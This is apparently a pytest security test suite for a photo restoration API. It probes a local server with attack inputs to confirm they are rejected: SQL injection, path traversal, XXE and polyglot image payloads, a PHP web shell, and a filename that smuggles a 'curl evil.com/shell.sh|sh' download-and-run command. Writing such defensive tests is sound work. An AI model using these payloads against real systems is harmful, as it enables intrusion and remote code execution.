"""
Comprehensive Security Test Suite for Photo Restoration API
Tests all OWASP Top 10 vulnerabilities and API-specific security concerns
"""

import pytest
import asyncio
import tempfile
import os
import json
import base64
from datetime import datetime, timedelta
from typing import Dict, Any

import httpx
from jose import jwt
import aiofiles

# Test configuration
TEST_API_URL = "http://localhost:8000"
TEST_JWT_SECRET = "test-secret-key"


class SecurityTestFramework:
    """Framework for security testing with utilities"""
    
    @staticmethod
    def create_test_token(user_id: str = "test_user", expired: bool = False) -> str:
        """Create test JWT token"""
        if expired:
            exp = datetime.utcnow() - timedelta(hours=1)
        else:
            exp = datetime.utcnow() + timedelta(minutes=30)
        
        payload = {
            "sub": user_id,
            "exp": exp,
            "iat": datetime.utcnow(),
            "type": "access",
            "jti": "test-jti",
            "scopes": ["enhance:create", "enhance:read"]
        }
        
        return jwt.encode(payload, TEST_JWT_SECRET, algorithm="HS256")
    
    @staticmethod
    def create_malicious_image(payload_type: str) -> bytes:
        """Create various malicious image payloads"""
        payloads = {
            "polyglot_html": b'\xff\xd8\xff\xe0\x00\x10JFIF<html><script>alert(1)</script></html>',
            "polyglot_php": b'\xff\xd8\xff\xe0\x00\x10JFIF<?php system($_GET["cmd"]); ?>',
            "image_bomb": b'P1\n65000 65000\n' + b'1 ' * 1000,  # PBM bomb
            "fake_jpeg": b'NOT_A_JPEG_FILE',
            "embedded_exe": b'\xff\xd8\xff\xe0\x00\x10JFIF' + b'\x00' * 100 + b'MZ\x90\x00',
        }
        return payloads.get(payload_type, b'INVALID')
    
    @staticmethod
    async def create_test_image(size_mb: int = 1) -> bytes:
        """Create valid test image of specified size"""
        # Simple valid PNG header
        png_header = b'\x89PNG\r\n\x1a\n'
        png_ihdr = b'\x00\x00\x00\rIHDR\x00\x00\x01\x00\x00\x00\x01\x00\x08\x02\x00\x00\x00'
        
        # Fill to desired size
        padding_size = (size_mb * 1024 * 1024) - len(png_header) - len(png_ihdr)
        padding = b'\x00' * max(0, padding_size)
        
        return png_header + png_ihdr + padding


@pytest.mark.asyncio
class TestAuthenticationSecurity:
    """Test authentication and authorization vulnerabilities"""
    
    async def test_missing_authentication(self):
        """Test endpoints require authentication"""
        async with httpx.AsyncClient() as client:
            # Test protected endpoints without auth
            endpoints = [
                ("/api/v1/enhance", "POST"),
                ("/api/v1/jobs/test-id", "GET"),
                ("/api/v1/jobs/test-id/result", "GET"),
                ("/api/v1/jobs/test-id", "DELETE")
            ]
            
            for endpoint, method in endpoints:
                if method == "POST":
                    response = await client.post(f"{TEST_API_URL}{endpoint}")
                elif method == "GET":
                    response = await client.get(f"{TEST_API_URL}{endpoint}")
                elif method == "DELETE":
                    response = await client.delete(f"{TEST_API_URL}{endpoint}")
                
                assert response.status_code == 401, f"{endpoint} allows unauthenticated access"
    
    async def test_invalid_token_formats(self):
        """Test various invalid token formats"""
        async with httpx.AsyncClient() as client:
            invalid_tokens = [
                "invalid_token",
                "Bearer ",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",  # Incomplete JWT
                "null",
                "",
                "undefined",
                base64.b64encode(b'{"user":"admin"}').decode()  # Not a JWT
            ]
            
            for token in invalid_tokens:
                headers = {"Authorization": f"Bearer {token}"}
                response = await client.get(
                    f"{TEST_API_URL}/api/v1/jobs/test-id",
                    headers=headers
                )
                assert response.status_code == 401, f"Accepted invalid token: {token}"
    
    async def test_expired_token(self):
        """Test expired token rejection"""
        async with httpx.AsyncClient() as client:
            expired_token = SecurityTestFramework.create_test_token(expired=True)
            headers = {"Authorization": f"Bearer {expired_token}"}
            
            response = await client.get(
                f"{TEST_API_URL}/api/v1/jobs/test-id",
                headers=headers
            )
            assert response.status_code == 401
            assert "expired" in response.text.lower() or "invalid" in response.text.lower()
    
    async def test_token_tampering(self):
        """Test token tampering detection"""
        async with httpx.AsyncClient() as client:
            valid_token = SecurityTestFramework.create_test_token()
            
            # Tamper with signature
            parts = valid_token.split('.')
            tampered_token = f"{parts[0]}.{parts[1]}.tampered_signature"
            
            headers = {"Authorization": f"Bearer {tampered_token}"}
            response = await client.get(
                f"{TEST_API_URL}/api/v1/jobs/test-id",
                headers=headers
            )
            assert response.status_code == 401
    
    async def test_authorization_bypass(self):
        """Test cross-user resource access"""
        async with httpx.AsyncClient() as client:
            # Create tokens for different users
            user1_token = SecurityTestFramework.create_test_token("user1")
            user2_token = SecurityTestFramework.create_test_token("user2")
            
            # User1 creates a job
            headers1 = {"Authorization": f"Bearer {user1_token}"}
            test_image = await SecurityTestFramework.create_test_image()
            
            response = await client.post(
                f"{TEST_API_URL}/api/v1/enhance",
                headers=headers1,
                files={"file": ("test.png", test_image, "image/png")}
            )
            
            if response.status_code == 200:
                job_id = response.json()["job_id"]
                
                # User2 tries to access User1's job
                headers2 = {"Authorization": f"Bearer {user2_token}"}
                response = await client.get(
                    f"{TEST_API_URL}/api/v1/jobs/{job_id}",
                    headers=headers2
                )
                assert response.status_code == 403, "Authorization bypass: cross-user access allowed"


@pytest.mark.asyncio
class TestInputValidation:
    """Test input validation and injection attacks"""
    
    async def test_sql_injection(self):
        """Test SQL injection protection"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            sql_payloads = [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'--",
                "1' UNION SELECT * FROM users--",
                "' OR 1=1--",
                "'; EXEC xp_cmdshell('whoami'); --"
            ]
            
            for payload in sql_payloads:
                response = await client.get(
                    f"{TEST_API_URL}/api/v1/jobs/{payload}",
                    headers=headers
                )
                # Should return 400 or 404, not 500 (which might indicate SQL error)
                assert response.status_code in [400, 404], f"Potential SQL injection with: {payload}"
                assert "sql" not in response.text.lower(), "SQL error exposed in response"
    
    async def test_path_traversal(self):
        """Test path traversal protection"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            path_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "/var/www/../../etc/passwd"
            ]
            
            for payload in path_payloads:
                # Test in filename
                response = await client.post(
                    f"{TEST_API_URL}/api/v1/enhance",
                    headers=headers,
                    files={"file": (payload, b"fake_content", "image/jpeg")}
                )
                assert response.status_code in [400, 413, 415], f"Path traversal accepted: {payload}"
    
    async def test_command_injection(self):
        """Test command injection protection"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            cmd_payloads = [
                "test.jpg; cat /etc/passwd",
                "test.jpg`whoami`",
                "test.jpg$(whoami)",
                "test.jpg|id",
                "test.jpg&&net user",
                'test";curl evil.com/shell.sh|sh;"'
            ]
            
            test_image = await SecurityTestFramework.create_test_image()
            
            for payload in cmd_payloads:
                response = await client.post(
                    f"{TEST_API_URL}/api/v1/enhance",
                    headers=headers,
                    files={"file": (payload, test_image, "image/jpeg")}
                )
                # Should sanitize filename, not execute commands
                assert response.status_code != 500, f"Potential command injection: {payload}"
    
    async def test_xxe_injection(self):
        """Test XML External Entity injection"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            # SVG with XXE payload
            xxe_svg = b'''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE svg [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <svg xmlns="http://www.w3.org/2000/svg">
                <text>&xxe;</text>
            </svg>'''
            
            response = await client.post(
                f"{TEST_API_URL}/api/v1/enhance",
                headers=headers,
                files={"file": ("test.svg", xxe_svg, "image/svg+xml")}
            )
            
            # Should reject SVG or sanitize XML
            assert response.status_code in [400, 415], "XXE payload not blocked"


@pytest.mark.asyncio
class TestFileUploadSecurity:
    """Test file upload vulnerabilities"""
    
    async def test_malicious_file_types(self):
        """Test malicious file type detection"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            malicious_files = [
                ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
                ("script.js", b"alert(document.cookie)", "application/javascript"),
                ("executable.exe", b"MZ\x90\x00", "application/x-msdownload"),
                ("script.py", b"import os; os.system('whoami')", "text/x-python"),
                ("macro.docm", b"PK\x03\x04", "application/vnd.ms-word.document.macroEnabled")
            ]
            
            for filename, content, content_type in malicious_files:
                response = await client.post(
                    f"{TEST_API_URL}/api/v1/enhance",
                    headers=headers,
                    files={"file": (filename, content, content_type)}
                )
                assert response.status_code in [400, 415], f"Accepted malicious file: {filename}"
    
    async def test_polyglot_files(self):
        """Test polyglot file detection"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            polyglot_types = [
                "polyglot_html",
                "polyglot_php",
                "embedded_exe"
            ]
            
            for poly_type in polyglot_types:
                malicious_image = SecurityTestFramework.create_malicious_image(poly_type)
                
                response = await client.post(
                    f"{TEST_API_URL}/api/v1/enhance",
                    headers=headers,
                    files={"file": ("test.jpg", malicious_image, "image/jpeg")}
                )
                assert response.status_code == 400, f"Accepted polyglot file: {poly_type}"
    
    async def test_file_size_limits(self):
        """Test file size limit enforcement"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            # Create oversized file (21MB)
            oversized_image = await SecurityTestFramework.create_test_image(21)
            
            response = await client.post(
                f"{TEST_API_URL}/api/v1/enhance",
                headers=headers,
                files={"file": ("large.png", oversized_image, "image/png")}
            )
            assert response.status_code == 413, "File size limit not enforced"
    
    async def test_image_bomb_protection(self):
        """Test decompression bomb protection"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            # Create image bomb
            image_bomb = SecurityTestFramework.create_malicious_image("image_bomb")
            
            response = await client.post(
                f"{TEST_API_URL}/api/v1/enhance",
                headers=headers,
                files={"file": ("bomb.pbm", image_bomb, "image/x-portable-bitmap")}
            )
            assert response.status_code in [400, 413], "Image bomb not detected"
    
    async def test_filename_sanitization(self):
        """Test filename sanitization"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            test_image = await SecurityTestFramework.create_test_image()
            
            dangerous_filenames = [
                "../../../etc/passwd",
                "C:\\Windows\\System32\\config\\SAM",
                "test\x00.jpg",  # Null byte
                "test%00.jpg",
                "con.jpg",  # Windows reserved name
                "prn.jpg",
                ".htaccess",
                "web.config"
            ]
            
            for filename in dangerous_filenames:
                response = await client.post(
                    f"{TEST_API_URL}/api/v1/enhance",
                    headers=headers,
                    files={"file": (filename, test_image, "image/jpeg")}
                )
                # Should accept but sanitize filename
                if response.status_code == 200:
                    job_data = response.json()
                    # Verify job was created with safe filename
                    assert job_data["job_id"], f"Filename not sanitized: {filename}"


@pytest.mark.asyncio
class TestRateLimiting:
    """Test rate limiting and DoS protection"""
    
    async def test_rate_limit_enforcement(self):
        """Test rate limit is enforced"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            # Make requests up to limit (assuming 10 per minute for testing)
            responses = []
            for i in range(15):
                response = await client.get(
                    f"{TEST_API_URL}/api/v1/jobs/test-id",
                    headers=headers
                )
                responses.append(response.status_code)
            
            # Should have some 429 responses
            assert 429 in responses, "Rate limiting not enforced"
    
    async def test_rate_limit_headers(self):
        """Test rate limit headers are present"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            response = await client.get(
                f"{TEST_API_URL}/api/v1/jobs/test-id",
                headers=headers
            )
            
            # Check for rate limit headers
            rate_limit_headers = [
                "X-RateLimit-Limit",
                "X-RateLimit-Remaining",
                "X-RateLimit-Reset"
            ]
            
            for header in rate_limit_headers:
                assert header in response.headers, f"Missing rate limit header: {header}"
    
    async def test_concurrent_request_limit(self):
        """Test concurrent request limiting"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            # Create many concurrent requests
            async def make_request():
                return await client.get(
                    f"{TEST_API_URL}/api/v1/jobs/test-id",
                    headers=headers
                )
            
            # Send 50 concurrent requests
            tasks = [make_request() for _ in range(50)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Should have some rate limited responses
            status_codes = [r.status_code for r in responses if not isinstance(r, Exception)]
            assert 429 in status_codes, "Concurrent request flooding not limited"


@pytest.mark.asyncio
class TestSecurityHeaders:
    """Test security headers and CORS"""
    
    async def test_security_headers_present(self):
        """Test all security headers are present"""
        async with httpx.AsyncClient() as client:
            response = await client.get(f"{TEST_API_URL}/health")
            
            required_headers = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": "DENY",
                "X-XSS-Protection": "1; mode=block",
                "Referrer-Policy": "strict-origin-when-cross-origin",
                "Content-Security-Policy": None,  # Just check presence
                "Permissions-Policy": None
            }
            
            for header, expected_value in required_headers.items():
                assert header in response.headers, f"Missing security header: {header}"
                if expected_value:
                    assert response.headers[header] == expected_value, \
                        f"Incorrect {header} value: {response.headers[header]}"
    
    async def test_cors_configuration(self):
        """Test CORS is properly configured"""
        async with httpx.AsyncClient() as client:
            # Test preflight request
            response = await client.options(
                f"{TEST_API_URL}/api/v1/enhance",
                headers={
                    "Origin": "https://evil.com",
                    "Access-Control-Request-Method": "POST"
                }
            )
            
            # Should not allow arbitrary origins
            if "Access-Control-Allow-Origin" in response.headers:
                assert response.headers["Access-Control-Allow-Origin"] != "*", \
                    "CORS allows all origins"
                assert response.headers["Access-Control-Allow-Origin"] != "https://evil.com", \
                    "CORS allows untrusted origin"
    
    async def test_content_type_validation(self):
        """Test content-type validation"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "text/html"  # Wrong content type
            }
            
            response = await client.post(
                f"{TEST_API_URL}/api/v1/enhance",
                headers=headers,
                content="<html><body>test</body></html>"
            )
            
            assert response.status_code in [400, 415], \
                "Accepted wrong content-type"


@pytest.mark.asyncio
class TestErrorHandling:
    """Test error handling and information disclosure"""
    
    async def test_error_message_sanitization(self):
        """Test error messages don't leak sensitive info"""
        async with httpx.AsyncClient() as client:
            # Trigger various errors
            error_triggers = [
                ("/api/v1/jobs/../../etc/passwd", "GET"),
                ("/api/v1/jobs/'; DROP TABLE--", "GET"),
                ("/api/v1/nonexistent", "GET"),
                ("/api/v1/enhance", "POST")  # No auth
            ]
            
            for endpoint, method in error_triggers:
                if method == "GET":
                    response = await client.get(f"{TEST_API_URL}{endpoint}")
                else:
                    response = await client.post(f"{TEST_API_URL}{endpoint}")
                
                # Check response doesn't contain sensitive info
                response_text = response.text.lower()
                sensitive_patterns = [
                    "traceback",
                    "stack trace",
                    "sqlalchemy",
                    "psycopg2",
                    "/home/",
                    "/usr/",
                    "c:\\",
                    "select * from",
                    "python",
                    "fastapi.exceptions"
                ]
                
                for pattern in sensitive_patterns:
                    assert pattern not in response_text, \
                        f"Error response contains sensitive info: {pattern}"
    
    async def test_debug_mode_disabled(self):
        """Test debug mode is disabled"""
        async with httpx.AsyncClient() as client:
            # Try to access debug endpoints
            debug_endpoints = [
                "/docs",
                "/redoc",
                "/openapi.json",
                "/__debug__",
                "/debug"
            ]
            
            for endpoint in debug_endpoints:
                response = await client.get(f"{TEST_API_URL}{endpoint}")
                assert response.status_code in [404, 403], \
                    f"Debug endpoint accessible: {endpoint}"


@pytest.mark.asyncio
class TestBusinessLogic:
    """Test business logic security issues"""
    
    async def test_race_condition_protection(self):
        """Test protection against race conditions"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            test_image = await SecurityTestFramework.create_test_image()
            
            # Try to process same image multiple times concurrently
            async def upload_image():
                return await client.post(
                    f"{TEST_API_URL}/api/v1/enhance",
                    headers=headers,
                    files={"file": ("test.png", test_image, "image/png")}
                )
            
            # Send 5 concurrent requests
            tasks = [upload_image() for _ in range(5)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Should handle concurrent uploads gracefully
            success_count = sum(1 for r in responses 
                              if not isinstance(r, Exception) and r.status_code == 200)
            assert success_count >= 1, "Cannot handle concurrent uploads"
    
    async def test_resource_exhaustion_protection(self):
        """Test protection against resource exhaustion"""
        async with httpx.AsyncClient() as client:
            token = SecurityTestFramework.create_test_token()
            headers = {"Authorization": f"Bearer {token}"}
            
            # Try to exhaust resources with complex image
            complex_image = await SecurityTestFramework.create_test_image(10)  # 10MB
            
            response = await client.post(
                f"{TEST_API_URL}/api/v1/enhance",
                headers=headers,
                files={"file": ("complex.png", complex_image, "image/png")},
                json={"upscale_factor": 4}  # Maximum upscaling
            )
            
            # Should either process or reject gracefully
            assert response.status_code in [200, 400, 413, 429], \
                "Resource exhaustion not handled"


# Test runner
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--asyncio-mode=auto"])